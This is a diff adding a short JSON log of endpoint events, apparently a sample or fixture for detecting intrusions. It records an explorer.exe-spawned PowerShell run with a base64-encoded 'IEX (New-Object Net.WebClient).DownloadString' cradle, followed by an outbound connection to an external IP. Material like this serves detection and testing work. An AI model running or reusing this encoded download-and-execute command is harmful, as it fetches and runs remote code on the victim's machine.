@@ -1,0 +1,19 @@
+[
+  {
+    "timestamp": "2026-02-10T16:45:18Z",
+    "host": "workstation-07",
+    "user": "mturner",
+    "event_type": "process_start",
+    "parent_process": "explorer.exe",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA"
+  },
+  {
+    "timestamp": "2026-02-10T16:45:22Z",
+    "host": "workstation-07",
+    "event_type": "network_connection",
+    "destination_ip": "45.67.89.101",
+    "destination_port": 443,
+    "protocol": "TCP"
+  }
+]
